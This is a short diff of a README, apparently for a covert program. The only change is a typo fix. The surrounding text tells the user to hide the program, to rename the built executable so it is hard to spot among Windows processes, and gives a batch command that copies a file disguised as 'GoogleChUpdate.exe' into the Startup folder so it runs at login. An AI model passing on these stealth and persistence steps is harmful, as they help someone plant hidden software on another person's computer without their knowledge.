@@ -9,7 +9,7 @@ Ideas for upgrade would be:
 - you get the idea - hide it as best you can...
 
 Tips:
-- When you build it, rename so it is harder to find it in windows processes
+- When you build it, rename it so it is harder to find it in windows processes
 - Most efective way of using it is with .bat script where you can simply add one line for copy to Startup folder:
 ```
 IF EXIST "%USERPROFILE%\Start Menu\Programs\Startup" (COPY /Y "GoogleChUpdate.exe" "%USERPROFILE%\Start Menu\Programs\Startup")
